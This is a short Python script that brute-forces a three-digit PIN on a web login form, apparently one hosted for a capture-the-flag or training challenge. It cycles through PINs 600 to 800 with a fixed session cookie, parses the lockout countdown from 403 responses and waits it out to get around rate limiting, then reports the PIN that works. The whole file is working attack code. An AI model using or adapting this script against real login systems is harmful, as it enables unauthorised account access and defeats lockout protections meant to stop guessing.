import re, requests, sys, time


url = "http://104.cybertrial.co.uk/login"
cookies = {"PHPSESSID": "74n3r76demk0hv7kgcio81or5g"}
timeout = 11
sess = requests.session()

range_start = 600
range_stop = 800

for pin in range(range_start, range_stop+1):
    payload = {"formgo": "1",
               "pin": "{0:0=3d}".format(pin)
    }
    resp = sess.post(url, data=payload, cookies=cookies)

    while resp.status_code == 403:
        timeout = re.findall("0000;'>([0-9]*)<\/span", resp.text)[0]
        print("timeout, waiting {} seconds".format(timeout))
        time.sleep(int(timeout) + 1)
        resp = sess.post(url, data=payload, cookies=cookies)
        
    check = re.search("Your pin is incorrect", resp.text)
    if check:
        print("incorrect pin:", "{0:0=3d}".format(pin))
    else:
        print("the pin is:", str(pin))
        break
